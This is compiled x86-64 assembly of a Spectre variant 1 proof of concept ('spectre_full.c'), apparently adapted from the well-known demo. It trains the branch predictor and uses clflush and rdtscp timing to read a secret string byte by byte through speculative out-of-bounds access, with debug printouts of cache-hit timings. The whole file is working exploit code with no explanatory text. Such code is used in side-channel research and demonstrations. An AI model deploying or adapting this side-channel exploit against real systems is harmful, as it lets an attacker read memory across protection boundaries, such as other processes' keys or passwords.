	.file	"spectre_full.c"
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.comm	unused1,64,32
	.globl	array1
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.byte	1
	.byte	2
	.byte	3
	.byte	4
	.byte	5
	.byte	6
	.byte	7
	.byte	8
	.byte	9
	.byte	10
	.byte	11
	.byte	12
	.byte	13
	.byte	14
	.byte	15
	.byte	16
	.zero	144
	.comm	unused2,64,32
	.comm	array2,131072,32
	.globl	secret
	.section	.rodata
	.align 8
.LC0:
	.string	"The Magic Words are Squeamish Ossifrage."
	.data
	.align 8
	.type	secret, @object
	.size	secret, 8
secret:
	.quad	.LC0
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.text
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB3695:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	movq	%rdi, -8(%rbp)
	movl	array1_size(%rip), %eax
	movl	%eax, %eax
	cmpq	-8(%rbp), %rax
	jbe	.L3
	movq	-8(%rbp), %rax
	addq	$array1, %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	sall	$9, %eax
	cltq
	movzbl	array2(%rax), %edx
	movzbl	temp(%rip), %eax
	andl	%edx, %eax
	movb	%al, temp(%rip)
.L3:
	nop
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3695:
	.size	victim_function, .-victim_function
	.section	.rodata
.LC1:
	.string	"secret=%c %d\n"
	.align 8
.LC2:
	.string	"  secret here ********mix_i=%d , time=%lu**********\n"
	.align 8
.LC3:
	.string	"  hit   ********mix_i=%d , time=%lu**********\n"
	.align 8
.LC4:
	.string	"  mix_i = array1[tries %% array1_size] : mix_i=%d , time=%lu\n"
	.text
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB3696:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	pushq	%r12
	pushq	%rbx
	subq	$144, %rsp
	.cfi_offset 12, -24
	.cfi_offset 3, -32
	movq	%rdi, -136(%rbp)
	movq	%rsi, -144(%rbp)
	movq	%rdx, -152(%rbp)
	movl	%ecx, -156(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -24(%rbp)
	xorl	%eax, %eax
	movl	$0, -124(%rbp)
	movq	secret(%rip), %rdx
	movl	-156(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %edx
	movq	secret(%rip), %rcx
	movl	-156(%rbp), %eax
	cltq
	addq	%rcx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	movl	%eax, %esi
	movl	$.LC1, %edi
	movl	$0, %eax
	call	printf
	movl	$0, -112(%rbp)
	jmp	.L5
.L6:
	movl	-112(%rbp), %eax
	cltq
	movl	$0, results.21944(,%rax,4)
	addl	$1, -112(%rbp)
.L5:
	cmpl	$255, -112(%rbp)
	jle	.L6
	movl	$3, -116(%rbp)
	jmp	.L7
.L31:
	movl	$0, -112(%rbp)
	jmp	.L8
.L9:
	movl	-112(%rbp), %eax
	sall	$9, %eax
	cltq
	addq	$array2, %rax
	movq	%rax, -32(%rbp)
	movq	-32(%rbp), %rax
	clflush	(%rax)
	addl	$1, -112(%rbp)
.L8:
	cmpl	$255, -112(%rbp)
	jle	.L9
	movl	-116(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movq	%rax, -88(%rbp)
	movl	$29, -108(%rbp)
	jmp	.L10
.L13:
	movq	$array1_size, -96(%rbp)
	movq	-96(%rbp), %rax
	clflush	(%rax)
	movl	$0, -120(%rbp)
	jmp	.L11
.L12:
	movl	-120(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -120(%rbp)
.L11:
	movl	-120(%rbp), %eax
	cmpl	$99, %eax
	jle	.L12
	movl	-108(%rbp), %ecx
	movl	$715827883, %edx
	movl	%ecx, %eax
	imull	%edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	addl	%eax, %eax
	addl	%edx, %eax
	addl	%eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %edx
	leal	-1(%rdx), %eax
	movw	$0, %ax
	cltq
	movq	%rax, -72(%rbp)
	movq	-72(%rbp), %rax
	shrq	$16, %rax
	orq	%rax, -72(%rbp)
	movq	-136(%rbp), %rax
	xorq	-88(%rbp), %rax
	andq	-72(%rbp), %rax
	xorq	-88(%rbp), %rax
	movq	%rax, -72(%rbp)
	movq	-72(%rbp), %rax
	movq	%rax, %rdi
	call	victim_function
	subl	$1, -108(%rbp)
.L10:
	cmpl	$0, -108(%rbp)
	jns	.L13
	movl	$0, -112(%rbp)
	jmp	.L14
.L22:
	movl	-112(%rbp), %eax
	imull	$167, %eax, %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -100(%rbp)
	movl	-100(%rbp), %eax
	sall	$9, %eax
	cltq
	addq	$array2, %rax
	movq	%rax, -64(%rbp)
	leaq	-124(%rbp), %rax
	movq	%rax, -56(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-56(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	leaq	-124(%rbp), %rax
	movq	%rax, -48(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-48(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	movq	%rax, %r12
	movq	-64(%rbp), %rax
	movzbl	(%rax), %eax
	movzbl	%al, %eax
	movl	%eax, -124(%rbp)
	leaq	-124(%rbp), %rax
	movq	%rax, -40(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-40(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	leaq	-124(%rbp), %rax
	movq	%rax, -80(%rbp)
	rdtscp
	movl	%ecx, %esi
	movq	-80(%rbp), %rcx
	movl	%esi, (%rcx)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%r12, %rax
	movq	%rax, %rbx
	movq	secret(%rip), %rdx
	movl	-156(%rbp), %eax
	cltq
	addq	%rdx, %rax
	movzbl	(%rax), %eax
	movsbl	%al, %eax
	cmpl	-100(%rbp), %eax
	jne	.L19
	movl	-100(%rbp), %eax
	movq	%rbx, %rdx
	movl	%eax, %esi
	movl	$.LC2, %edi
	movl	$0, %eax
	call	printf
.L19:
	cmpq	$80, %rbx
	ja	.L20
	movl	-116(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movzbl	array1(%rax), %eax
	movzbl	%al, %eax
	cmpl	-100(%rbp), %eax
	je	.L20
	movl	-100(%rbp), %eax
	movq	%rbx, %rdx
	movl	%eax, %esi
	movl	$.LC3, %edi
	movl	$0, %eax
	call	printf
	movl	-100(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	leal	1(%rax), %edx
	movl	-100(%rbp), %eax
	cltq
	movl	%edx, results.21944(,%rax,4)
	jmp	.L21
.L20:
	movl	-116(%rbp), %eax
	movl	array1_size(%rip), %ecx
	movl	$0, %edx
	divl	%ecx
	movl	%edx, %eax
	movl	%eax, %eax
	movzbl	array1(%rax), %eax
	movzbl	%al, %eax
	cmpl	-100(%rbp), %eax
	jne	.L21
	movl	-100(%rbp), %eax
	movq	%rbx, %rdx
	movl	%eax, %esi
	movl	$.LC4, %edi
	movl	$0, %eax
	call	printf
.L21:
	addl	$1, -112(%rbp)
.L14:
	cmpl	$255, -112(%rbp)
	jle	.L22
	movl	$10, %edi
	call	putchar
	movl	$-1, -104(%rbp)
	movl	-104(%rbp), %eax
	movl	%eax, -108(%rbp)
	movl	$0, -112(%rbp)
	jmp	.L23
.L28:
	cmpl	$0, -108(%rbp)
	js	.L24
	movl	-112(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %edx
	movl	-108(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	cmpl	%eax, %edx
	jl	.L25
.L24:
	movl	-108(%rbp), %eax
	movl	%eax, -104(%rbp)
	movl	-112(%rbp), %eax
	movl	%eax, -108(%rbp)
	jmp	.L26
.L25:
	cmpl	$0, -104(%rbp)
	js	.L27
	movl	-112(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %edx
	movl	-104(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	cmpl	%eax, %edx
	jl	.L26
.L27:
	movl	-112(%rbp), %eax
	movl	%eax, -104(%rbp)
.L26:
	addl	$1, -112(%rbp)
.L23:
	cmpl	$255, -112(%rbp)
	jle	.L28
	movl	-108(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %edx
	movl	-104(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	addl	%eax, %eax
	addl	$5, %eax
	cmpl	%eax, %edx
	jge	.L29
	movl	-108(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	cmpl	$2, %eax
	jne	.L30
	movl	-104(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	testl	%eax, %eax
	je	.L29
.L30:
	subl	$1, -116(%rbp)
.L7:
	cmpl	$0, -116(%rbp)
	jg	.L31
.L29:
	movl	results.21944(%rip), %eax
	movl	%eax, %edx
	movl	-124(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.21944(%rip)
	movl	-108(%rbp), %eax
	movl	%eax, %edx
	movq	-144(%rbp), %rax
	movb	%dl, (%rax)
	movl	-108(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %edx
	movq	-152(%rbp), %rax
	movl	%edx, (%rax)
	movq	-144(%rbp), %rax
	addq	$1, %rax
	movl	-104(%rbp), %edx
	movb	%dl, (%rax)
	movq	-152(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-104(%rbp), %eax
	cltq
	movl	results.21944(,%rax,4), %eax
	movl	%eax, (%rdx)
	nop
	movq	-24(%rbp), %rax
	xorq	%fs:40, %rax
	je	.L32
	call	__stack_chk_fail
.L32:
	addq	$144, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3696:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
.LC5:
	.string	"%p"
.LC6:
	.string	"%d"
.LC7:
	.string	"Reading %d bytes:\n"
.LC8:
	.string	"len=%d\n"
	.align 8
.LC9:
	.string	"Reading at malicious_x = %p... "
.LC10:
	.string	"Success"
.LC11:
	.string	"Unclear"
.LC12:
	.string	"%s: "
.LC13:
	.string	"?"
.LC14:
	.string	"0x%02X=\342\200\231%c\342\200\231 score=%d "
	.align 8
.LC15:
	.string	"(second best: 0x%02X score=%d)"
	.text
	.globl	main
	.type	main, @function
main:
.LFB3697:
	.cfi_startproc
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$80, %rsp
	movl	%edi, -68(%rbp)
	movq	%rsi, -80(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movq	secret(%rip), %rax
	movq	%rax, %rdx
	movl	$array1, %eax
	subq	%rax, %rdx
	movq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movl	$40, -52(%rbp)
	movl	$0, -44(%rbp)
	movl	$0, -48(%rbp)
	jmp	.L34
.L35:
	movl	-48(%rbp), %eax
	cltq
	movb	$1, array2(%rax)
	addl	$1, -48(%rbp)
.L34:
	movl	-48(%rbp), %eax
	cmpl	$131071, %eax
	jbe	.L35
	cmpl	$3, -68(%rbp)
	jne	.L36
	movq	-80(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	movl	$.LC5, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf
	movq	-40(%rbp), %rax
	movl	$array1, %edx
	subq	%rdx, %rax
	movq	%rax, -40(%rbp)
	movq	-80(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-52(%rbp), %rdx
	movl	$.LC6, %esi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf
.L36:
	movl	$1, -52(%rbp)
	movl	-52(%rbp), %eax
	movl	%eax, -44(%rbp)
	movl	-52(%rbp), %eax
	movl	%eax, %esi
	movl	$.LC7, %edi
	movl	$0, %eax
	call	printf
	jmp	.L37
.L43:
	movl	-52(%rbp), %eax
	movl	$10, %edx
	subl	%eax, %edx
	movl	%edx, %eax
	movl	%eax, %esi
	movl	$.LC8, %edi
	movl	$0, %eax
	call	printf
	movq	-40(%rbp), %rax
	movq	%rax, %rsi
	movl	$.LC9, %edi
	movl	$0, %eax
	call	printf
	movl	-44(%rbp), %eax
	leal	-1(%rax), %edx
	movl	-52(%rbp), %eax
	movl	%edx, %ecx
	subl	%eax, %ecx
	movq	-40(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -40(%rbp)
	leaq	-32(%rbp), %rdx
	leaq	-16(%rbp), %rsi
	movq	%rax, %rdi
	call	readMemoryByte
	movl	-32(%rbp), %eax
	movl	-28(%rbp), %edx
	addl	%edx, %edx
	cmpl	%edx, %eax
	jl	.L38
	movl	$.LC10, %eax
	jmp	.L39
.L38:
	movl	$.LC11, %eax
.L39:
	movq	%rax, %rsi
	movl	$.LC12, %edi
	movl	$0, %eax
	call	printf
	movl	-32(%rbp), %edx
	movzbl	-16(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-16(%rbp), %eax
	cmpb	$126, %al
	ja	.L40
	movzbl	-16(%rbp), %eax
	movzbl	%al, %eax
	movq	%rax, %rsi
	jmp	.L41
.L40:
	movl	$.LC13, %esi
.L41:
	movzbl	-16(%rbp), %eax
	movzbl	%al, %eax
	movl	%edx, %ecx
	movq	%rsi, %rdx
	movl	%eax, %esi
	movl	$.LC14, %edi
	movl	$0, %eax
	call	printf
	movl	-28(%rbp), %eax
	testl	%eax, %eax
	jle	.L42
	movl	-28(%rbp), %edx
	movzbl	-15(%rbp), %eax
	movzbl	%al, %eax
	movl	%eax, %esi
	movl	$.LC15, %edi
	movl	$0, %eax
	call	printf
.L42:
	movl	$10, %edi
	call	putchar
.L37:
	movl	-52(%rbp), %eax
	subl	$1, %eax
	movl	%eax, -52(%rbp)
	movl	-52(%rbp), %eax
	testl	%eax, %eax
	jns	.L43
	movl	$0, %eax
	movq	-8(%rbp), %rcx
	xorq	%fs:40, %rcx
	je	.L45
	call	__stack_chk_fail
.L45:
	leave
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE3697:
	.size	main, .-main
	.local	results.21944
	.comm	results.21944,1024,32
	.ident	"GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609"
	.section	.note.GNU-stack,"",@progbits
